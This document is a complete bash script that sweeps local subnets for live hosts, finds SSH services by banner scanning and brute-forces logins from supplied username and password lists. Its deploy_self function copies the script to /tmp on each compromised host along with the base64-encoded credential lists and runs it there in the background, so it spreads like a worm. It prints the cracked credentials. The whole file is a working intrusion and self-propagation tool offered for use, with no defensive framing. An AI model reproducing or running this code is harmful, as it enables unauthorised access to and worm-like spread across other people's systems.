#!/bin/bash

# Usage:
#   ./script.sh [user_file] [pass_file] [host] [-p PORT] [--no-deploy]
# Examples:
#   ./script.sh users.txt passwords.txt
#   ./script.sh users.txt passwords.txt 192.168.1.10 -p 2222
#   ./script.sh users.txt passwords.txt -p 2222   # scan network

# Default files
USERS_FILE="${USERS_FILE:-users.list}"
PASSWORDS_FILE="${PASSWORDS_FILE:-passwords.list}"

# Tunable parameters
PING_TIMEOUT="${PING_TIMEOUT:-1}"
MAX_PING_JOBS="${MAX_PING_JOBS:-64}"
SSH_SCAN_START="${SSH_SCAN_START:-1}"
SSH_SCAN_END="${SSH_SCAN_END:-2000}"
MAX_HOSTS_SCAN="${MAX_HOSTS_SCAN:-65536}"

USERS=()
PASSWORDS=()
RESULTS=()
SSH_HOSTS=()
BANNER=""
TEMP_FILES=()
DEPLOYED_HOSTS=()
NO_DEPLOY=0
PORT_ARG=""

# --- CIDR helpers ---
ip2int() {
    local a b c d
    IFS='.' read -r a b c d <<< "$1"
    echo $(( (a << 24) + (b << 16) + (c << 8) + d ))
}
int2ip() {
    echo "$(( ($1 >> 24) & 255 )).$(( ($1 >> 16) & 255 )).$(( ($1 >> 8) & 255 )).$(( $1 & 255 ))"
}
net_addr() {
    local ip_int mask_int
    ip_int=$(ip2int "$1")
    mask_int=$(( (0xFFFFFFFF << (32 - $2)) & 0xFFFFFFFF ))
    int2ip $(( ip_int & mask_int ))
}
bcast_addr() {
    local ip_int mask_int inv_mask
    ip_int=$(ip2int "$1")
    mask_int=$(( (0xFFFFFFFF << (32 - $2)) & 0xFFFFFFFF ))
    inv_mask=$(( mask_int ^ 0xFFFFFFFF ))
    int2ip $(( ip_int | inv_mask ))
}
gen_ips() {
    local net_int bcast_int start end i
    net_int=$(ip2int "$1")
    bcast_int=$(ip2int "$(bcast_addr "$1" "$2")")
    start=$(( net_int + 1 ))
    end=$(( bcast_int - 1 ))
    (( start > end )) && return 0
    if (( end - start + 1 > MAX_HOSTS_SCAN )); then
        echo "Error: subnet $1/$2 too large (max $MAX_HOSTS_SCAN), skipping." >&2
        return 1
    fi
    for (( i=start; i<=end; i++ )); do int2ip "$i"; done
}

# --- Auto base64 decode for credential files ---
auto_b64dec() {
    local file="$1" out
    out=$(mktemp)
    if base64 -d "$file" > "$out" 2>/dev/null && ! LC_ALL=C grep -qaP '[^\x20-\x7E\n\r]' "$out" 2>/dev/null; then
        TEMP_FILES+=("$out")
        echo "$out"
    else
        rm -f "$out"
        echo "$file"
    fi
}
cleanup() { for f in "${TEMP_FILES[@]}"; do rm -f "$f"; done; }

# --- Load credentials ---
load_creds() {
    local user pass src_u src_p
    USERS=(); PASSWORDS=()
    [[ ! -f "$USERS_FILE" ]] && { echo "Error: $USERS_FILE not found" >&2; return 1; }
    [[ ! -f "$PASSWORDS_FILE" ]] && { echo "Error: $PASSWORDS_FILE not found" >&2; return 1; }

    src_u=$(auto_b64dec "$USERS_FILE"); src_p=$(auto_b64dec "$PASSWORDS_FILE")
    [[ "$src_u" != "$USERS_FILE" ]] && echo "Detected base64-encoded users file" >&2
    [[ "$src_p" != "$PASSWORDS_FILE" ]] && echo "Detected base64-encoded passwords file" >&2

    while IFS= read -r user || [[ -n "$user" ]]; do
        [[ -z "$user" || "$user" =~ ^[[:space:]]*# ]] && continue
        USERS+=("$user")
    done < "$src_u"

    while IFS= read -r pass || [[ -n "$pass" ]]; do
        [[ -z "$pass" || "$pass" =~ ^[[:space:]]*# ]] && continue
        PASSWORDS+=("$pass")
    done < "$src_p"

    (( ${#USERS[@]} == 0 )) && { echo "Error: no users found" >&2; return 1; }
    (( ${#PASSWORDS[@]} == 0 )) && { echo "Error: no passwords found" >&2; return 1; }
}

# --- Network detection ---
detect_nets() {
    local iface addr ip prefix
    local -a nets=()
    if command -v ip >/dev/null 2>&1; then
        while read -r iface addr; do
            [[ -z "$addr" ]] && continue
            ip="${addr%%/*}"; prefix="${addr##*/}"
            [[ -z "$prefix" || "$prefix" == "$addr" ]] && prefix=24
            [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
            nets+=("$iface|$ip|$prefix")
        done < <(ip -4 -o addr show scope global 2>/dev/null | awk '{print $2, $4}')
    elif command -v ifconfig >/dev/null 2>&1; then
        while read -r ip; do
            [[ -z "$ip" || "$ip" == "127.0.0.1" ]] && continue
            ip="${ip%%/*}"
            [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
            nets+=("unknown|$ip|24")
        done < <(ifconfig 2>/dev/null | awk '/inet / {print $2}')
    else
        echo "Error: no network tools found" >&2; return 1
    fi
    (( ${#nets[@]} )) || return 1
    printf '%s\n' "${nets[@]}"
}

# --- Host alive check ---
alive() {
    ping -c 1 -W "$PING_TIMEOUT" "$1" >/dev/null 2>&1 && return 0
    command -v nc >/dev/null && nc -z -w "$PING_TIMEOUT" "$1" 22 >/dev/null 2>&1
}

# --- Scan alive hosts in subnet ---
scan_alive() {
    local net="${1%%|*}" pfx="${1##*|}" ip res jobcnt
    res=$(mktemp)
    echo "Scanning alive hosts in ${net}/${pfx} ..." >&2
    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue
        ( alive "$ip" && echo "$ip" >> "$res" ) &
        jobcnt=$(jobs -rp | wc -l)
        while (( jobcnt >= MAX_PING_JOBS )); do wait -n 2>/dev/null || wait; jobcnt=$(jobs -rp | wc -l); done
    done < <(gen_ips "$net" "$pfx")
    wait
    if [[ -s "$res" ]]; then
        sort -u "$res"
        rm -f "$res"; return 0
    fi
    rm -f "$res"; return 1
}

# --- SSH detection ---
get_banner() { echo | nc -w 2 "$1" "$2" 2>/dev/null | head -c 128; }
is_ssh() { local b; b=$(get_banner "$1" "$2"); [[ "$b" =~ ^SSH- ]]; }
find_ssh() {
    local port
    echo "Scanning SSH on $1 (${SSH_SCAN_START}-${SSH_SCAN_END})..." >&2
    for port in $(seq "$SSH_SCAN_START" "$SSH_SCAN_END"); do
        if is_ssh "$1" "$port"; then
            BANNER=$(get_banner "$1" "$port")
            echo "$port"; return 0
        fi
    done
    return 1
}
resolve_ssh() {
    if is_ssh "$1" "$2"; then
        BANNER=$(get_banner "$1" "$2")
        echo "$2"; return 0
    fi
    find_ssh "$1"
}

# --- Login attempts ---
try_login() {
    local host=$1 port=$2 user=$3 pass=$4 scr
    scr=$(mktemp)
    printf '#!/bin/bash\necho %q\n' "$pass" > "$scr"
    chmod +x "$scr"
    export SSH_ASKPASS="$scr" SSH_ASKPASS_REQUIRE=force DISPLAY="${DISPLAY:-:0}"
    if setsid ssh -p "$port" -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=10 "$user@$host" "exit 0" </dev/null 2>/dev/null; then
        rm -f "$scr"; return 0
    fi
    rm -f "$scr"; return 1
}

# --- Deploy self to remote host and execute (only once per host) ---
deploy_self() {
    local host=$1 port=$2 user=$3 pass=$4
    # Prevent duplicate deployments on same host
    for d in "${DEPLOYED_HOSTS[@]}"; do
        [[ "$d" == "$host" ]] && return 0
    done
    # Encode credentials as base64
    local enc_users enc_pass
    enc_users=$(printf '%s\n' "${USERS[@]}" | base64 -w0)
    enc_pass=$(printf '%s\n' "${PASSWORDS[@]}" | base64 -w0)
    # Create askpass for scp/ssh
    local askpass_script
    askpass_script=$(mktemp)
    printf '#!/bin/bash\necho %q\n' "$pass" > "$askpass_script"
    chmod +x "$askpass_script"
    export SSH_ASKPASS="$askpass_script" SSH_ASKPASS_REQUIRE=force DISPLAY="${DISPLAY:-:0}"

    echo "  [DEPLOY] Copying script to $host and launching..." >&2
    # Copy script to remote /tmp/ss.sh
    if ! setsid scp -P "$port" -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$0" "$user@$host:/tmp/ss.sh" </dev/null 2>/dev/null; then
        echo "  [DEPLOY] SCP failed" >&2
        rm -f "$askpass_script"; return 1
    fi

    # Execute remote: create encoded files, run script with --no-deploy, clean up
    setsid ssh -p "$port" -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$user@$host" \
        "cat > /tmp/u.b64 << 'EOF1'
$enc_users
EOF1
cat > /tmp/p.b64 << 'EOF2'
$enc_pass
EOF2
chmod +x /tmp/ss.sh
USERS_FILE=/tmp/u.b64 PASSWORDS_FILE=/tmp/p.b64 /tmp/ss.sh -p $port --no-deploy
rm -f /tmp/u.b64 /tmp/p.b64 /tmp/ss.sh" </dev/null 2>/dev/null &

    rm -f "$askpass_script"
    DEPLOYED_HOSTS+=("$host")
}

# --- Brute-force a host, then deploy if successful ---
brute_host() {
    local host=$1 port=$2 user pass
    for user in "${USERS[@]}"; do
        for pass in "${PASSWORDS[@]}"; do
            if try_login "$host" "$port" "$user" "$pass"; then
                RESULTS+=("${host}|${port}|${user}|${pass}|${BANNER}")
                echo "  [OK] ${host}:${port} user=${user} pass=${pass}" >&2
                if (( ! NO_DEPLOY )); then
                    deploy_self "$host" "$port" "$user" "$pass"
                fi
            fi
        done
    done
}

process_host() {
    local host=$1 port=$2 ssh_port
    echo "Checking SSH on $host ..." >&2
    if ! ssh_port=$(resolve_ssh "$host" "$port"); then
        echo "  No SSH service found on $host" >&2; return 1
    fi
    SSH_HOSTS+=("${host}:${ssh_port}")
    echo "  SSH on $host:$ssh_port ($BANNER)" >&2
    brute_host "$host" "$ssh_port"
}

# --- Subnet collection ---
collect_nets() {
    local -n src=$1 dst=$2 entry iface ip prefix net subnet
    dst=()
    for entry in "${src[@]}"; do
        IFS='|' read -r iface ip prefix <<< "$entry"
        net=$(net_addr "$ip" "$prefix")
        subnet="${net}|${prefix}"
        if [[ ! " ${dst[*]} " =~ " ${subnet} " ]]; then
            dst+=("$subnet")
        fi
    done
}

# --- Output ---
print_nets() {
    local -n lines=$1 entry iface ip prefix net bcast
    echo "=== Local network detection ==="
    for entry in "${lines[@]}"; do
        IFS='|' read -r iface ip prefix <<< "$entry"
        net=$(net_addr "$ip" "$prefix"); bcast=$(bcast_addr "$ip" "$prefix")
        echo "  interface: $iface"
        echo "  local ip:  $ip"
        echo "  prefix:    /$prefix"
        echo "  network:   $net"
        echo "  broadcast: $bcast"
        echo "  scan range: $net - $bcast (excluding network/broadcast)"
        echo "---"
    done
}
no_ip_msg() { echo; echo "=== Result ==="; echo "No active IP found in the network."; }
no_cred_msg() {
    echo; echo "=== Result ==="
    ((${#SSH_HOSTS[@]})) && echo "Active IPs were found, but no SSH service was detected on any host."
    echo "No valid username/password combination found."
}
print_results() {
    local host port user pass b i
    echo; echo "=== Final results ==="
    ((${#RESULTS[@]})) || { no_cred_msg; return 1; }
    for i in "${!RESULTS[@]}"; do
        IFS='|' read -r host port user pass b <<< "${RESULTS[$i]}"
        echo "$((i + 1)). ip: $host | port: $port | user: $user | pass: $pass | banner: $b"
    done
}

# --- Main scan controllers ---
scan_and_test() {
    local port=$1 subnet host
    local -a net_lines=() subnets=() alive_hosts=()
    RESULTS=(); SSH_HOSTS=()

    mapfile -t net_lines < <(detect_nets) || { echo "Error: no local networks" >&2; return 1; }
    ((${#net_lines[@]})) || { echo "Error: no local networks" >&2; return 1; }
    print_nets net_lines
    collect_nets net_lines subnets
    ((${#subnets[@]})) || { echo "Error: no scan ranges" >&2; return 1; }

    for subnet in "${subnets[@]}"; do
        while IFS= read -r host; do
            [[ -n "$host" ]] && alive_hosts+=("$host")
        done < <(scan_alive "$subnet" || true)
    done

    ((${#alive_hosts[@]})) || { no_ip_msg; return 1; }
    mapfile -t alive_hosts < <(printf '%s\n' "${alive_hosts[@]}" | sort -u)

    echo; echo "=== Alive hosts (${#alive_hosts[@]}) ==="
    printf '  %s\n' "${alive_hosts[@]}"
    echo

    for host in "${alive_hosts[@]}"; do process_host "$host" "$port" || true; done
    print_results
}

single_host() {
    local host=$1 port=$2
    RESULTS=(); SSH_HOSTS=()
    echo "Single host mode: $host"
    alive "$host" || { no_ip_msg; return 1; }
    process_host "$host" "$port" || true
    print_results
}

# ==================== ENTRY POINT ====================
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Parse arguments
    POSITIONAL=()
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -p|--port)
                PORT_ARG="$2"; shift 2 ;;
            --no-deploy)
                NO_DEPLOY=1; shift ;;
            -*)
                echo "Unknown option: $1" >&2; exit 1 ;;
            *)
                POSITIONAL+=("$1"); shift ;;
        esac
    done

    # First two positional args are user/password files
    [[ ${#POSITIONAL[@]} -ge 1 ]] && USERS_FILE="${POSITIONAL[0]}"
    [[ ${#POSITIONAL[@]} -ge 2 ]] && PASSWORDS_FILE="${POSITIONAL[1]}"
    [[ ${#POSITIONAL[@]} -ge 3 ]] && HOST="${POSITIONAL[2]}"

    load_creds || exit 1
    trap cleanup EXIT

    if [[ -n "$PORT_ARG" ]]; then
        PORT="$PORT_ARG"
    else
        read -rp "Enter SSH port [22]: " PORT
        PORT="${PORT:-22}"
    fi

    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
        echo "Error: invalid port $PORT" >&2; exit 1
    fi

    if [[ -n "${HOST:-}" ]]; then
        single_host "$HOST" "$PORT"
    else
        scan_and_test "$PORT"
    fi
fi